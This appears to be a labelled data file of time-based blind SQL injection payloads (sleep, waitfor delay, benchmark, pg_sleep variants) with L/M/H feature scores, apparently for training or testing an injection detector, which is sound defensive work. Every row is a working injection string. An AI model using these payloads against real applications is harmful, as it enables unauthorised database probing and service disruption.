sqli	d_char	d_token	punck	s_token	space	length	alw_true	output
sleep(__time__)#	L	L	L	L	L	L	L	L
1 or sleep(__time__)#	L	M	L	L	L	M	L	L
" or sleep(__time__)#	M	M	L	L	L	M	L	M
' or sleep(__time__)#	M	M	L	L	L	M	L	M
" or sleep(__time__)="	M	M	L	L	L	M	L	M
' or sleep(__time__)='	M	M	L	L	L	M	L	M
1) or sleep(__time__)#	L	M	M	L	L	M	L	L
") or sleep(__time__)="	M	M	M	L	L	M	L	H
') or sleep(__time__)='	M	M	M	L	L	M	L	H
1)) or sleep(__time__)#	L	M	M	L	L	M	L	L
")) or sleep(__time__)="	M	M	M	L	L	M	L	H
')) or sleep(__time__)='	M	M	M	L	L	M	L	H
;waitfor delay '0:0:__time__'--	M	M	M	M	L	M	L	H
);waitfor delay '0:0:__time__'--	M	M	M	M	L	M	L	H
';waitfor delay '0:0:__time__'--	M	M	M	M	L	M	L	H
";waitfor delay '0:0:__time__'--	M	M	M	M	L	M	L	H
');waitfor delay '0:0:__time__'--	M	M	M	M	L	M	L	H
");waitfor delay '0:0:__time__'--	M	M	M	M	L	M	L	H
));waitfor delay '0:0:__time__'--	M	M	M	M	L	M	L	H
'));waitfor delay '0:0:__time__'--	M	M	M	M	L	M	L	H
"));waitfor delay '0:0:__time__'--	M	M	M	M	L	M	L	H
benchmark(10000000,md5(1))#	L	M	M	M	L	M	L	H
1 or benchmark(10000000,md5(1))#	L	M	M	M	L	M	L	H
" or benchmark(10000000,md5(1))#	M	M	M	M	L	M	L	H
' or benchmark(10000000,md5(1))#	M	M	M	M	L	M	L	H
1) or benchmark(10000000,md5(1))#	L	M	M	M	L	M	L	H
") or benchmark(10000000,md5(1))#	M	M	M	M	L	M	L	H
') or benchmark(10000000,md5(1))#	M	M	M	M	L	M	L	H
1)) or benchmark(10000000,md5(1))#	L	M	M	M	L	M	L	H
")) or benchmark(10000000,md5(1))#	M	M	M	M	L	M	L	H
')) or benchmark(10000000,md5(1))#	M	M	M	M	L	M	L	H
pg_sleep(__time__)--	L	L	M	L	L	L	L	L
1 or pg_sleep(__time__)--	L	M	M	L	L	M	L	L
